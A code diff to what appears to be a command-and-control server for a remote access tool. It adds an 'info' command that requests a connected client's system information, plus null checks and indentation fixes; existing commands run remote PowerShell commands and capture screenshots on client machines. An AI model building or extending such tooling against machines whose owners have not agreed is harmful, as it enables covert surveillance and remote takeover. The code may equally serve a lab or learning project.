@@ -134,8 +134,8 @@ def central_commands():
             msg = input('> ')
 
             if msg == 'exit':
-                    exit = True
-                    break
+                exit = True
+                break
             
             menu_option = msg.split(' ')[0]
             if menu_option == 'help':
@@ -148,6 +148,8 @@ def central_commands():
                 get_SC(msg)
             elif menu_option == 'shell':
                 send_shell(msg)
+            elif menu_option == 'info':
+                get_info(msg)
             elif menu_option == '':
                 pass
             else :
@@ -165,6 +167,10 @@ Available Commands:
 
     list
         List clients connected to the server.
+          
+    info [clientID]
+        Gives the client system infos. 
+        example : > info 1
 
     send_echo [clientID] ["message"]
         Send an echo message to the specified client.
@@ -190,7 +196,7 @@ def list_clients():
 
 
 # REFACTOR : Verify that the socket is not closed, share the method from client
-def get_client(msg: str) :
+def get_client(msg : str) :
     """ Return socket.socket object """
     
     id = int(msg.split(' ')[1])
@@ -202,13 +208,22 @@ def get_client(msg: str) :
     return None
 
 
+def get_info(msg):
+    client_socket = get_client(msg)
+    if client_socket :
+        command = 'get_sys_infos'
+        client_socket.sendall(command.encode('utf-8'))
+
+
 def send_echo(msg: str) :
     client_socket = get_client(msg)
-    echo_msg = msg.split('\"')[1].replace('\"', "")
+    
+    if client_socket :
+        echo_msg = msg.split('\"')[1].replace('\"', "")
 
-    command = f"echo {echo_msg}"
-    print(f'echo {echo_msg} sent')
-    client_socket.sendall(command.encode('utf-8'))
+        command = f"echo {echo_msg}"
+        print(f'echo {echo_msg} sent')
+        client_socket.sendall(command.encode('utf-8'))
 
 
 def get_SC(msg: str):
@@ -225,6 +240,9 @@ def send_shell(msg: str):
     """ Usage : shell 1 powershell ls -n"""
 
     client_socket = get_client(msg)
+    if not client_socket :
+        return
+    
     command = re.split('\w+ \d+ ', msg)[1] # Do some join if there's more than 1 @
     print(f'Command : {command} sent')
 
